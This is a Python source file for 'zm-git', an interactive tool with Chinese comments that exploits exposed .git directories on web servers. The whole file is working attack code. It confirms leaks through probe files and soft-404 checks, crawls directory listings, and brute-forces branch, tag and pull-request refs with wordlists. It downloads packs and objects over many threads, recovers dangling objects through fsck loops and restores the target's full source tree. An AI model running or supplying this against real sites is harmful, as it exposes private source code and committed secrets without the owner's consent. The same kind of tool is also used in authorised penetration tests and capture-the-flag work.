#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
zm-git - .git 泄露利用工具 (交互式 / 彩色输出 / 宽松URL)

能力:
  1. 目录列举模式: 自动递归爬取整个 .git (GitTools dumper 能力)
  2. 无列举模式: 静态文件 + index/logs/refs 递归下载 loose objects (GitHacker 能力)
  3. 哑协议利用: 通过 objects/info/packs 直接下载 pack 文件
  4. 分支/tag 引用爆破
  5. git fsck --lost-found 闭环, 找回悬空对象直到收敛
  6. 软404对抗 + 动态工作队列线程池

用法:
  python3 zm-git.py                          # 交互式
  python3 zm-git.py 127.0.0.1:1234           # 裸地址自动补全
  python3 zm-git.py https://site.com -t 64
"""

import argparse
import hashlib
import os
import re
import shutil
import struct
import subprocess
import sys
import threading
import zlib
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
from urllib.parse import urljoin, urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
except ImportError:
    print("[-] pip3 install requests")
    sys.exit(1)

# ---------- 彩色输出 ----------
if os.name == "nt":
    os.system("")  # Win10+ 启用 ANSI 转义

_NO_COLOR = not sys.stdout.isatty() or os.environ.get("NO_COLOR")


class C:
    R = "" if _NO_COLOR else "\033[91m"
    G = "" if _NO_COLOR else "\033[92m"
    Y = "" if _NO_COLOR else "\033[93m"
    B = "" if _NO_COLOR else "\033[94m"
    M = "" if _NO_COLOR else "\033[95m"
    CY = "" if _NO_COLOR else "\033[96m"
    BOLD = "" if _NO_COLOR else "\033[1m"
    DIM = "" if _NO_COLOR else "\033[2m"
    E = "" if _NO_COLOR else "\033[0m"


def info(msg): print(f"{C.CY}[*]{C.E} {msg}")
def ok(msg):   print(f"{C.G}[+]{C.E} {msg}")
def warn(msg): print(f"{C.Y}[!]{C.E} {msg}")
def err(msg):  print(f"{C.R}[-]{C.E} {msg}")
def dim(msg):  print(f"{C.DIM}    {msg}{C.E}")

BANNER = rf"""{C.G}{C.BOLD}
  ________  ___       ______ _ _
 |___  /  \/  |      |  ____(_) |
    / /| \  / |______| |  __ _| |_
   / / | |\/| |______| | |_ | | __|
  / /__| |  | |      | |__| | | |_
 /_____|_|  |_|       \_____|_|\__|
{C.E}{C.DIM}  .git 泄露利用工具 | GitTools + GitHacker 融合增强版{C.E}
"""

SHA1_RE = re.compile(rb"\b[0-9a-f]{40}\b")
HREF_RE = re.compile(r'href="([^"?#][^"]*)"')

# HEAD 被禁时的次级探测文件: (路径, 内容签名验证器)
PROBE_FILES = [
    ("config",             lambda d: b"[core]" in d and b"repositoryformatversion" in d),
    ("description",        lambda d: b"repository" in d[:200]),
    ("index",              lambda d: d[:4] == b"DIRC"),
    ("packed-refs",        lambda d: d.lstrip().startswith(b"# pack-refs") or bool(SHA1_RE.search(d))),
    ("objects/info/packs", lambda d: d.lstrip().startswith(b"P pack-")),
    ("logs/HEAD",          lambda d: len(SHA1_RE.findall(d)) >= 2),
]

# 目录列举页中的 git 特征条目 (至少出现 2 个才确认, 防误报)
LISTING_SIGS = (b'"objects/"', b'"refs/"', b'"HEAD"', b'"packed-refs"',
                b'"config"', b'"info/"', b'"logs/"', b'"hooks/"')


def run_git(args, cwd=None, gitdir=None, timeout=300):
    """统一的 git 调用: 强制 UTF-8 解码 (防中文 Windows GBK 崩溃), 永不返回 None"""
    cmd = ["git"]
    if gitdir:
        cmd += ["--git-dir", gitdir]
    if cwd:
        cmd += ["-C", cwd]
    cmd += args
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           encoding="utf-8", errors="replace", timeout=timeout)
        return r.returncode, r.stdout or "", r.stderr or ""
    except (OSError, subprocess.TimeoutExpired):
        return -1, "", ""

STATIC_FILES = [
    "HEAD", "config", "index", "packed-refs", "description",
    "COMMIT_EDITMSG", "ORIG_HEAD", "FETCH_HEAD", "MERGE_HEAD", "MERGE_MSG",
    "MERGE_MODE", "SQUASH_MSG", "REVERT_HEAD", "CHERRY_PICK_HEAD", "AUTO_MERGE",
    "shallow", "commondir", "info/grafts",
    "info/refs", "info/exclude", "info/attributes", "info/packs",
    "objects/info/packs", "objects/info/alternates", "objects/info/http-alternates",
    "logs/HEAD", "logs/refs/stash", "logs/refs/notes/commits",
    "refs/stash", "refs/wip/wtree", "refs/wip/index",
    "refs/notes/commits", "refs/bisect/bad",
    "refs/remotes/origin/HEAD", "logs/refs/remotes/origin/HEAD",
]

# 分支名爆破字典 (按真实开源项目统计的常见命名)
BRANCH_NAMES = [
    # 绝对主力
    "master", "main", "dev", "develop", "development", "test", "testing",
    "stage", "staging", "prod", "production", "pre", "preview", "release",
    # 流程分支
    "hotfix", "bugfix", "bug", "fix", "feature", "feat", "wip", "draft",
    "backup", "bak", "old", "temp", "tmp", "new", "demo", "example",
    # 环境/部署
    "deploy", "deployment", "gh-pages", "pages", "docker", "ci", "cd",
    "server", "client", "web", "api", "app", "admin", "backend", "frontend",
    # 版本分支
    "v1", "v2", "v3", "v1.0", "v2.0", "1.0", "2.0", "beta", "alpha", "rc",
    "stable", "latest", "nightly", "release-1.0", "release-2.0",
    # 中文开发常见
    "dev-zm", "zm", "dev1", "dev2", "mydev", "local", "home", "work",
    # 其他高频
    "trunk", "default", "head", "base", "core", "common", "public",
    "private", "secret", "hidden", "internal", "debug", "dev-test",
    "feature-x", "init", "update", "patch", "hotfix-1", "dev-master",
    "source", "src", "code", "data", "docs", "doc", "www", "blog",
]

# tag 爆破字典
TAG_NAMES = [
    "v1.0", "v0.1", "v2.0", "v1.1", "v1.0.0", "v0.0.1", "v3.0", "v2.1",
    "1.0", "0.1", "2.0", "1.0.0", "1.1", "0.0.1",
    "release", "init", "first", "v1", "v2", "v3", "beta", "alpha",
    "rc1", "rc-1", "stable", "latest", "final", "release-1.0", "v1.0.1",
]

# GitHub PR 引用 (refs/pull/N/head, refs/pull/N/merge)
PULL_RANGE = 20

# 线程拉满当前环境上限 (I/O 密集型, 按 CPU 核数放大)
MAX_THREADS = min(256, max(32, (os.cpu_count() or 8) * 16))
# 固定输出目录, 每次运行前覆盖
FIXED_OUTDIR = os.path.abspath("zm-git-output")


def build_ref_paths(extra_names=None, pull_range=PULL_RANGE):
    paths = list(STATIC_FILES)
    branches = list(BRANCH_NAMES)
    tags = list(TAG_NAMES)
    if extra_names:  # 自定义字典的词同时当分支和 tag 爆
        branches += extra_names
        tags += extra_names
    for b in dict.fromkeys(branches):
        paths += [f"refs/heads/{b}", f"logs/refs/heads/{b}",
                  f"refs/remotes/origin/{b}", f"logs/refs/remotes/origin/{b}"]
    for t in dict.fromkeys(tags):
        paths += [f"refs/tags/{t}", f"logs/refs/tags/{t}"]
    for n in range(1, pull_range + 1):
        paths += [f"refs/pull/{n}/head", f"refs/pull/{n}/merge",
                  f"logs/refs/pull/{n}/head"]
    return paths


def normalize_url(raw):
    """宽松解析: 接受 127.0.0.1:1234 / site.com / site.com/.git / site.com/repo 等
    返回候选 base 列表:
      - 无协议输入时 http/https 都试
      - 路径含 .git: 原样使用
      - 路径不含 .git: 优先试 补/.git, 再试 路径本身(兼容 git 文件直接挂路径下的情况)"""
    raw = raw.strip()
    if not raw:
        return []
    schemes = ["http", "https"]
    if "://" in raw:
        p = urlparse(raw)
        schemes = [p.scheme]
        host_path = p.netloc + p.path
    else:
        host_path = raw
    host_path = host_path.strip("/")
    if not host_path:
        host_path = ".git"
    paths = [host_path] if ".git" in host_path else [host_path + "/.git", host_path]
    return [f"{s}://{p}/" for p in paths for s in schemes]


class Dumper:
    def __init__(self, url, outdir, threads=32, proxy=None, timeout=10,
                 use_git=True, crawl=True, brute=True, wordlist=None, pulls=PULL_RANGE):
        self.candidates = normalize_url(url)
        self.base = None
        self.outdir_input = outdir
        self.outdir = None
        self.gitdir = None
        self.threads = threads
        self.timeout = timeout
        self.use_git = use_git and shutil.which("git") is not None
        self.crawl_enabled = crawl
        self.brute = brute
        self.pull_range = pulls
        self.extra_names = []
        if wordlist:
            try:
                with open(wordlist, encoding="utf-8", errors="replace") as f:
                    self.extra_names = [l.strip().strip("/") for l in f
                                        if l.strip() and not l.startswith("#")]
            except OSError as e:
                warn(f"字典读取失败: {e}")
        self.soft404 = False

        self.session = requests.Session()
        self.session.verify = False
        self.session.trust_env = False  # 忽略环境变量代理, 代理请用 -p 显式指定
        self.session.headers["User-Agent"] = "git/2.40.0"
        self.proxy = proxy
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        ad = HTTPAdapter(pool_connections=threads, pool_maxsize=threads, max_retries=1)
        self.session.mount("http://", ad)
        self.session.mount("https://", ad)

        self.lock = threading.Lock()
        self.queued = set()
        self.dl_count = 0
        self.fail = []
        self.stop_crawl = False

    # ---------- 网络层 ----------
    def _raw(self, path):
        try:
            r = self.session.get(urljoin(self.base, path), timeout=self.timeout)
            return r.status_code, r.content
        except requests.RequestException:
            return -1, b""

    def fetch(self, path, is_object=False):
        code, body = self._raw(path)
        if code != 200 or not body:
            return None
        if self.soft404:
            if is_object:
                if body[0] != 0x78:
                    return None
                try:
                    zlib.decompress(body)
                except zlib.error:
                    return None
            elif body.lstrip()[:1] == b"<":
                return None
        elif body.lstrip()[:15].lower().startswith(b"<!doctype html"):
            return None
        return body

    def detect_soft404(self):
        code, body = self._raw("ThisFileDoesNotExist-zm-git-404")
        if code == 200:
            self.soft404 = True
            warn("检测到软404服务器, 启用内容校验模式")

    def save(self, path, data):
        fp = os.path.join(self.gitdir, path)
        os.makedirs(os.path.dirname(fp), exist_ok=True)
        with open(fp, "wb") as f:
            f.write(data)

    # ---------- 阶段 1: 检测 (自动选择可用 base) ----------
    def check(self):
        self.base = self.candidates[0]
        self.detect_soft404()
        for cand in self.candidates:
            info(f"尝试: {C.BOLD}{cand}{C.E}")
            self.base = cand
            d = self.fetch("HEAD")
            if d and (d.startswith(b"ref:") or SHA1_RE.fullmatch(d.strip())):
                ok(f".git 泄露确认! HEAD => {C.Y}{d.decode(errors='replace').strip()}{C.E}")
                return True
            # HEAD 被禁的畸形配置: 用带签名校验的次级文件兑底
            for path, validator in PROBE_FILES:
                d = self.fetch(path)
                if d and validator(d):
                    ok(f".git 泄露确认! (HEAD 不可读, 通过 {C.Y}{path}{C.E} 签名确认)")
                    return True
            # 文件全 403 但目录列举开着: 看列举页里的 git 特征条目
            code, body = self._raw("")
            if code == 200 and b"href=" in body:
                hits = sum(1 for s in LISTING_SIGS if s in body)
                if hits >= 2:
                    ok(f".git 泄露确认! (文件被禁, 通过{C.Y}目录列举{C.E}发现 {hits} 个 git 特征)")
                    return True
            dim("不可用, 换下一个候选" if cand != self.candidates[-1] else "")
        err("未发现 .git 泄露")
        return False

    def setup_dirs(self):
        self.outdir = os.path.abspath(self.outdir_input) if self.outdir_input else FIXED_OUTDIR
        # 每次运行覆盖输出目录
        if os.path.isdir(self.outdir):
            home = os.path.expanduser("~")
            if self.outdir in (os.path.sep, home) or len(self.outdir) < 8:
                err(f"拒绝覆盖危险目录: {self.outdir}")
                sys.exit(2)
            shutil.rmtree(self.outdir, ignore_errors=True)
        self.gitdir = os.path.join(self.outdir, ".git")
        os.makedirs(os.path.join(self.gitdir, "objects"), exist_ok=True)

    # ---------- 阶段 0: 智能协议探测 (最优路径) ----------
    def try_smart_clone(self):
        """若服务端是 git-http-backend, 直接 git clone 拿全量打包数据"""
        if not self.use_git:
            return False
        url = self.base.rstrip("/")
        try:
            r = self.session.get(url + "/info/refs?service=git-upload-pack",
                                 timeout=self.timeout)
        except requests.RequestException:
            return False
        if r.status_code != 200 or "git-upload-pack" not in r.headers.get("Content-Type", ""):
            return False
        ok(f"服务端开启 {C.G}git 智能协议{C.E}! 直接 git clone (单次打包传输, 最快路径)")
        import shutil as sh
        sh.rmtree(self.outdir, ignore_errors=True)   # clone 要求目标目录不存在
        cmd = ["clone", "--quiet"]
        if self.proxy:
            cmd += ["-c", f"http.proxy={self.proxy}"]
        code, _, errout = run_git(cmd + [url, self.outdir], timeout=900)
        if code == 0:
            return True
        warn(f"clone 失败 ({errout.strip()[:80]}), 回退哑协议逐对象下载")
        os.makedirs(os.path.join(self.gitdir, "objects"), exist_ok=True)
        return False

    # ---------- 阶段 2: 目录列举爬取 ----------
    def try_crawl(self):
        if not self.crawl_enabled:
            return 0
        code, body = self._raw("")
        if code != 200 or b"href=" not in body or (b"Parent" not in body and b"HEAD" not in body):
            return 0
        ok("检测到目录列举(autoindex), 启用全量爬取模式")
        count = [0]

        def walk(rel):
            if self.stop_crawl or count[0] > 20000:
                return
            _, html = self._raw(rel)
            for link in HREF_RE.findall(html.decode(errors="replace")):
                if link.startswith(("../", "/")):
                    continue
                full = rel + link
                if link.endswith("/"):
                    walk(full)
                else:
                    d = self.fetch(full)
                    if d is not None:
                        self.save(full, d)
                        count[0] += 1
                        if count[0] % 200 == 0:
                            print(f"\r    {C.DIM}已爬取 {count[0]} 个文件...{C.E}", end="", flush=True)
        walk("")
        if count[0]:
            ok(f"爬取完成: {C.BOLD}{count[0]}{C.E} 个文件")
        return count[0]

    # ---------- 阶段 3: 静态文件 + 引用爆破 ----------
    def download_static(self):
        paths = build_ref_paths(self.extra_names, self.pull_range) if self.brute else STATIC_FILES
        info(f"下载静态文件/爆破引用 ({C.BOLD}{len(paths)}{C.E} 个路径, {self.threads} 线程)")
        with ThreadPoolExecutor(self.threads) as ex:
            results = list(ex.map(lambda p: (p, self.fetch(p)), paths))
        hit = 0
        for p, d in results:
            if d is not None:
                self.save(p, d)
                hit += 1
                dim(f"{C.G}hit{C.E} {p}")
        ok(f"静态文件命中: {hit}/{len(paths)}")

    # ---------- 阶段 4: 哑协议 pack 下载 ----------
    def download_packs(self):
        data = self.fetch("objects/info/packs")
        if not data:
            return 0
        packs = re.findall(rb"^P (pack-[0-9a-f]{40}\.pack)", data, re.M)
        if not packs:
            return 0
        ok(f"objects/info/packs 可读! 发现 {C.BOLD}{len(packs)}{C.E} 个 pack")
        os.makedirs(os.path.join(self.gitdir, "objects", "pack"), exist_ok=True)
        for p in packs:
            name = p.decode()
            for suffix in (".pack", ".idx"):
                fn = name.replace(".pack", suffix)
                d = self.fetch(f"objects/pack/{fn}")
                if d is not None:
                    self.save(f"objects/pack/{fn}", d)
            size = os.path.getsize(os.path.join(self.gitdir, "objects", "pack", name))
            dim(f"{C.G}ok{C.E} {name} ({size} bytes)")
        return len(packs)

    # ---------- 阶段 5: 对象递归下载 (动态工作队列) ----------
    def object_exists_local(self, sha):
        p = os.path.join(self.gitdir, "objects", sha[:2], sha[2:])
        if os.path.exists(p):
            return True
        if self.use_git:
            code, _, _ = run_git(["cat-file", "-e", sha], gitdir=self.gitdir)
            return code == 0
        return False

    def fetch_and_expand(self, sha):
        with self.lock:
            if sha in self.queued:
                return []
            self.queued.add(sha)
        # 本地优先: crawl/clone 已落盘的对象不再走网络
        local = os.path.join(self.gitdir, "objects", sha[:2], sha[2:])
        if os.path.exists(local):
            try:
                raw = open(local, "rb").read()
                de = zlib.decompress(raw)
            except (OSError, zlib.error):
                return []
        else:
            raw = self.fetch(f"objects/{sha[:2]}/{sha[2:]}", is_object=True)
            if raw is None:
                with self.lock:
                    self.fail.append(sha)
                return []
            try:
                de = zlib.decompress(raw)
            except zlib.error:
                return []
            self.save(f"objects/{sha[:2]}/{sha[2:]}", raw)
            with self.lock:
                self.dl_count += 1
                n = self.dl_count
            if n % 100 == 0:
                print(f"\r    {C.DIM}已下载对象: {n}{C.E}", end="", flush=True)

        header, _, body = de.partition(b"\x00")
        otype = header.split(b" ")[0]
        children = []
        if otype == b"commit":
            m = re.search(rb"tree ([0-9a-f]{40})", body)
            if m:
                children.append(m.group(1).decode())
            children += [p.decode() for p in re.findall(rb"parent ([0-9a-f]{40})", body)]
        elif otype == b"tag":
            m = re.search(rb"object ([0-9a-f]{40})", body)
            if m:
                children.append(m.group(1).decode())
        elif otype == b"tree":
            i = 0
            while i < len(body):
                try:
                    j = body.index(b"\x00", i)
                except ValueError:
                    break
                children.append(body[j + 1:j + 21].hex())
                i = j + 21
        return children

    def collect_seed_hashes(self):
        seeds = set()
        for root, _, files in os.walk(self.gitdir):
            if os.sep + "objects" in root or root.endswith("objects"):
                continue
            for fn in files:
                try:
                    with open(os.path.join(root, fn), "rb") as f:
                        seeds.update(m.group(0).decode() for m in SHA1_RE.finditer(f.read()))
                except OSError:
                    pass
        for name, sha in self.parse_index():
            seeds.add(sha)
        seeds.discard("0" * 40)  # 过滤 null SHA (日志首个 commit 的 old 字段)
        return seeds

    def download_objects(self, seeds):
        info(f"递归下载对象 ({len(seeds)} 个种子)...")
        with ThreadPoolExecutor(self.threads) as ex:
            pending = {ex.submit(self.fetch_and_expand, s) for s in seeds}
            while pending:
                done, pending = wait(pending, return_when=FIRST_COMPLETED)
                for fut in done:
                    try:
                        for child in fut.result():
                            with self.lock:
                                known = child in self.queued
                            if not known:
                                pending.add(ex.submit(self.fetch_and_expand, child))
                    except Exception:
                        pass
        print()
        # 失败重试一轮 (网络抖动误伤)
        if self.fail:
            retry = list(dict.fromkeys(self.fail))
            self.fail.clear()
            info(f"重试 {len(retry)} 个失败对象...")
            with ThreadPoolExecutor(min(self.threads, 32)) as ex:
                list(ex.map(self.fetch_and_expand, retry))
        ok(f"对象下载完成: {C.BOLD}{self.dl_count}{C.E} 个, 缺失 {len(self.fail)} 个")

    # ---------- fsck 闭环 ----------
    def fsck_loop(self):
        if not self.use_git:
            return
        for it in range(8):
            _, out, errout = run_git(["fsck", "--full", "--unreachable", "--dangling"],
                                     gitdir=self.gitdir)
            hashes = set(m.group(0) for m in SHA1_RE.finditer((out + errout).encode()))
            new = [h for h in hashes if not self.object_exists_local(h)]
            if not new:
                break
            info(f"fsck 第 {it + 1} 轮: 发现 {C.Y}{len(new)}{C.E} 个缺失对象, 继续下载")
            self.download_objects(new)
        run_git(["fsck", "--lost-found"], gitdir=self.gitdir)

    # ---------- HEAD/index 丢失时从对象重建 ----------
    def rebuild_head_from_objects(self):
        """从已下载对象中找 commit, 把 tip commit 重建为 HEAD (兼容 pack 里的对象)"""
        commits = {}  # sha -> set(parent shas)
        if self.use_git:
            # git 要求仓库必须有 HEAD 才认可, 先写占位
            self.save("HEAD", b"ref: refs/heads/master\n")
            code, out, _ = run_git(["cat-file", "--batch-all-objects", "--batch-check"],
                                   gitdir=self.gitdir)
            shas = [l.split()[0] for l in out.splitlines() if l.split()[1:2] == ["commit"]]
            for s in shas:
                _, body, _ = run_git(["cat-file", "-p", s], gitdir=self.gitdir)
                commits[s] = set(re.findall(r"parent ([0-9a-f]{40})", body))
        else:
            odir = os.path.join(self.gitdir, "objects")
            for d1 in os.listdir(odir):
                if len(d1) != 2:
                    continue
                for fn in os.listdir(os.path.join(odir, d1)):
                    try:
                        de = zlib.decompress(open(os.path.join(odir, d1, fn), "rb").read())
                    except Exception:
                        continue
                    header, _, body = de.partition(b"\x00")
                    if header.startswith(b"commit"):
                        commits[d1 + fn] = set(p.decode() for p in
                                               re.findall(rb"parent ([0-9a-f]{40})", body))
        if not commits:
            return False
        all_parents = set().union(*commits.values())
        tips = [s for s in commits if s not in all_parents] or list(commits)
        tip = tips[0]
        self.save("HEAD", b"ref: refs/heads/master\n")
        self.save("refs/heads/master", (tip + "\n").encode())
        ok(f"从对象重建 HEAD -> {C.Y}{tip[:8]}{C.E} (共 {len(commits)} 个 commit, {len(tips)} 个 tip)")
        if len(tips) > 1:
            dim("多个 tip, 其余可用 git fsck --lost-found 找回")
        return True

    # ---------- 还原工作区 ----------
    def parse_index(self):
        idx = os.path.join(self.gitdir, "index")
        if not os.path.exists(idx):
            return []
        with open(idx, "rb") as f:
            data = f.read()
        if data[:4] != b"DIRC":
            return []
        version, count = struct.unpack(">II", data[4:12])
        if version not in (2, 3):
            warn(f"index v{version} 暂不支持手动解析")
            return []
        entries, pos = [], 12
        for _ in range(count):
            if pos + 62 > len(data):
                break
            sha = data[pos + 40:pos + 60].hex()
            flags = struct.unpack(">H", data[pos + 60:pos + 62])[0]
            namelen = flags & 0x0FFF
            extended = bool(flags & 0x4000) and version >= 3
            ns = pos + 62 + (2 if extended else 0)
            if namelen < 0x0FFF:
                name = data[ns:ns + namelen].decode("utf-8", "replace")
            else:
                end = data.index(b"\x00", ns)
                name = data[ns:end].decode("utf-8", "replace")
                namelen = end - ns
            pos += ((ns - pos) + namelen + 8) // 8 * 8
            entries.append((name, sha))
        return entries

    def restore_manual(self):
        entries = self.parse_index()
        if not entries:
            warn("无 index, 跳过手动还原")
            return 0
        ok_n = 0
        for name, sha in entries:
            p = os.path.join(self.gitdir, "objects", sha[:2], sha[2:])
            if not os.path.exists(p):
                continue
            try:
                blob = zlib.decompress(open(p, "rb").read()).partition(b"\x00")[2]
            except zlib.error:
                continue
            fp = os.path.join(self.outdir, name)
            os.makedirs(os.path.dirname(fp) or self.outdir, exist_ok=True)
            with open(fp, "wb") as f:
                f.write(blob)
            ok_n += 1
        ok(f"手动还原文件: {ok_n}/{len(entries)}")
        return ok_n

    def restore_git(self):
        for cmd in (["checkout", "-f", "HEAD"], ["reset", "--hard", "HEAD"]):
            run_git(cmd, cwd=self.outdir, timeout=120)
        code, out, _ = run_git(["ls-files"], cwd=self.outdir)
        n = len(out.strip().splitlines()) if code == 0 and out else 0
        ok(f"git 还原工作区完成, 追踪文件: {C.BOLD}{n}{C.E}")
        return n

    # ---------- 主流程 ----------
    def run(self):
        if not self.check():
            return 1
        self.setup_dirs()
        code, git_ver, _ = run_git(["--version"]) if self.use_git else (-1, "", "")
        info(f"本地 git: {git_ver.strip() or (C.Y + '不可用, 将纯Python手动还原' + C.E)}")

        cloned = self.try_smart_clone()
        crawled = 0 if cloned else self.try_crawl()
        if cloned:
            # clone 只拉 heads/tags, 补上 logs/stash/pull 等哑协议独有文件
            self.download_static()
            seeds = self.collect_seed_hashes()
            if seeds:
                self.download_objects(seeds)
        elif crawled == 0:
            self.download_static()
            self.download_packs()
            seeds = self.collect_seed_hashes()
            self.download_objects(seeds)
        else:
            self.download_static()
            seeds = self.collect_seed_hashes()
            if seeds:
                self.download_objects(seeds)

        self.fsck_loop()

        # HEAD/refs 被禁的场景: 从对象里重建 HEAD 再还原
        if not os.path.exists(os.path.join(self.gitdir, "HEAD")):
            self.rebuild_head_from_objects()

        restored = self.restore_git() if self.use_git else 0
        if restored == 0:
            self.restore_manual()

        n_commits = 0
        if self.use_git:
            code, out, _ = run_git(["log", "--all", "--oneline"], cwd=self.outdir)
            n_commits = len(out.strip().splitlines()) if code == 0 and out else 0

        print(f"\n{C.M}{C.BOLD}========== 结果 =========={C.E}")
        ok(f"loose objects: {self.dl_count}  |  缺失: {len(self.fail)}  |  commit: {C.G}{n_commits}{C.E}")
        ok(f"输出目录: {C.BOLD}{self.outdir}{C.E}")
        if self.fail:
            warn(f"{len(self.fail)} 个对象缺失 (可能在 pack 且 info/packs 被禁), 可用 GitTools extractor 离线处理")
        info("常用命令:")
        dim(f"cd {self.outdir}")
        dim("git log --all --oneline        # 全部提交")
        dim("git show <sha>                 # 查看提交内容 / 找 flag")
        dim("git fsck --lost-found          # 悬空对象")
        dim("ls .git/lost-found/commit/     # 找回的 commit")
        return 0


# ---------- 交互式 ----------
def prompt(text, default=None):
    suffix = f" [{default}]" if default is not None else ""
    try:
        v = input(f"{C.B}?{C.E} {C.BOLD}{text}{C.E}{C.DIM}{suffix}{C.E}: ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None
    return v or (str(default) if default is not None else "")


def interactive():
    print(BANNER)
    info(f"线程: {MAX_THREADS} (自动拉满)  |  输出目录: {FIXED_OUTDIR} (每次覆盖)")
    print()
    while True:
        url = prompt("目标 (如 127.0.0.1:1234 / https://site.com / site.com/xxx/.git)")
        if url is None:
            break
        if not url:
            warn("目标不能为空")
            continue
        proxy = prompt("代理 (可空)", "") or None
        print()
        d = Dumper(url, None, MAX_THREADS, proxy or None)
        try:
            d.run()
        except KeyboardInterrupt:
            warn("用户中断")
        print(f"\n{C.M}{'-' * 46}{C.E}")
        again = prompt("继续下一个目标? [y/N]")
        if not again or again.lower() not in ("y", "yes"):
            break
        print()


def main():
    ap = argparse.ArgumentParser(description="zm-git - .git 泄露利用工具 (交互式/彩色/宽松URL)")
    ap.add_argument("url", nargs="?", default=None, help="目标 (省略则进入交互式)")
    ap.add_argument("-o", "--output", default=None,
                    help=f"输出目录 (默认固定为 {FIXED_OUTDIR}, 每次覆盖)")
    ap.add_argument("-t", "--threads", type=int, default=MAX_THREADS,
                    help=f"线程数 (默认拉满: {MAX_THREADS})")
    ap.add_argument("-p", "--proxy", default=None, help="代理 http://127.0.0.1:8080")
    ap.add_argument("--timeout", type=int, default=10, help="请求超时秒数")
    ap.add_argument("--no-git", action="store_true", help="不使用本地 git (纯 python 还原)")
    ap.add_argument("--no-crawl", action="store_true", help="禁用目录列举爬取")
    ap.add_argument("--no-brute", action="store_true", help="禁用分支/tag 引用爆破")
    ap.add_argument("-w", "--wordlist", default=None, help="自定义分支/tag 名字典 (每行一个)")
    ap.add_argument("--pulls", type=int, default=PULL_RANGE,
                    help=f"GitHub PR 引用爆破范围 refs/pull/1..N (默认 {PULL_RANGE}, 0 关闭)")
    ap.add_argument("--no-color", action="store_true", help="禁用彩色输出")
    args = ap.parse_args()

    if args.no_color:
        for attr in ("R", "G", "Y", "B", "M", "CY", "BOLD", "DIM"):
            setattr(C, attr, "")
        C.E = ""

    import urllib3
    urllib3.disable_warnings()

    if args.url is None and sys.stdin.isatty():
        interactive()
        return

    if args.url is None:
        ap.print_help()
        sys.exit(2)

    outdir = args.output
    d = Dumper(args.url, outdir, args.threads, args.proxy, args.timeout,
               use_git=not args.no_git, crawl=not args.no_crawl, brute=not args.no_brute,
               wordlist=args.wordlist, pulls=args.pulls)
    try:
        sys.exit(d.run())
    except KeyboardInterrupt:
        warn("用户中断")
        sys.exit(130)


if __name__ == "__main__":
    main()
